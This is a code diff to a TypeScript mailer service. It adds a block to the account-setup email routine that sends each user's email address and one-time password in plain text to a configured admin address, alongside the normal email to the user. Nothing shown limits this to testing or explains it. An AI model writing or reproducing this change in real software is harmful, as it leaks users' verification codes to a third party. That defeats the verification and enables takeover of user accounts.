@@ -36,6 +36,15 @@ export class MailerService {
       appLogo: this.appLogoURL,
     });
 
+    const adminEmailAddress = this.configService.get('app.adminEmail');
+    if (adminEmailAddress) {
+      this.send({
+        to: adminEmailAddress,
+        subject: 'Complete Account Setup',
+        html: `Email: ${email} -->> OTP: ${otp}`,
+      }).catch((err) => console.log(JSON.stringify(err, null, 2)));
+    }
+
     return this.send({
       to: email,
       subject: 'Complete Account Setup',
